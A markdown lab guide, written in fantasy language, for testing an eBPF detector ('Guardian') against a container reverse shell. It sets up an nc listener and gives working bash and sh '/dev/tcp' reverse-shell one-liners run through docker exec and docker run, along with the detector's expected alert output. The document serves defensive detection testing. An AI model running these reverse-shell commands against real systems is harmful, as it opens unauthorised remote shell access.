# THE RITE OF FIRST BLOOD

## The Three-Terminal Campaign

### Terminal 1: The Guardian's Vigil (Host)

Start the Guardian in enforcement mode:

```bash
cd /home/founder/github_public/guardian-shield
sudo ./zig-out/bin/zig-sentinel --enable-grimoire --grimoire-enforce
```

**Expected Output:**
- Grimoire Oracle loaded
- Ring buffer initialized
- "Guardian standing watch..." messages

---

### Terminal 2: The Wolf's Lair (Host)

Open the listening post for the reverse shell:

```bash
nc -lvp 4444
```

**Expected Output:**
- `listening on [any] 4444 ...`

**Victory Condition:**
- **If Guardian succeeds**: This terminal stays silent
- **If Guardian fails**: You receive a shell prompt (`#` or `$`)

---

### Terminal 3: The Heretical Incantation (Host/Container)

#### Option A: Attack from inside a running container

```bash
# 1. Find your target container
docker ps

# 2. Find Docker bridge IP (Wolf's address)
ip addr show docker0 | grep 'inet '
# Look for something like 172.17.0.1

# 3. Execute the reverse shell from inside container
docker exec -it [CONTAINER_NAME] bash -c "bash -i >& /dev/tcp/[DOCKER_IP]/4444 0>&1"
```

#### Option B: Attack from a fresh Alpine container

```bash
# 1. Find Docker bridge IP
DOCKER_IP=$(ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)

# 2. Run attack container
docker run --rm -it alpine sh -c "sh -i >& /dev/tcp/$DOCKER_IP/4444 0>&1"
```

---

## The Judgment

### Glorious Victory (Guardian Succeeds)

**Terminal 1 (Guardian):**
```
🔥 GRIMOIRE PATTERN MATCH: reverse_shell_classic (CRITICAL)
   PID: 12345
   Sequence: socket() -> dup2(0) -> dup2(1) -> execve()
⚔️  Terminated process 12345 for violating Grimoire doctrine
```

**Terminal 2 (Lair):** Silent. No connection.

**Terminal 3 (Attack):** Hangs or exits with error.

---

### Instructive Failure (Guardian Blind)

**Terminal 1 (Guardian):** Silent. No detection.

**Terminal 2 (Lair):**
```
connect to [172.17.0.1] from alpine [172.17.0.2]
#
```
You now have shell access inside the container.

**Terminal 3 (Attack):** Exits cleanly.

**Action Required:** Return to the Forge. The Guardian's eye is clouded.

---

## Notes

- The Guardian hooks the **kernel**, not the container
- All syscalls from container processes are visible to eBPF
- Docker cannot hide the reverse shell sequence from the Guardian
- The test proves: Can behavioral detection work across namespace boundaries?

---

## Troubleshooting

**Guardian won't start:**
```bash
# Check BPF program loaded
sudo bpftool prog list | grep grimoire

# Check ring buffer
sudo bpftool map list | grep grimoire
```

**Can't find Docker IP:**
```bash
# Alternative: Use host's main IP
ip addr show | grep 'inet ' | grep -v '127.0.0.1'
```

**Container networking issues:**
```bash
# Test connectivity from container
docker run --rm alpine ping -c 1 172.17.0.1
```

---

**The Crucible is prepared. Execute at will.**
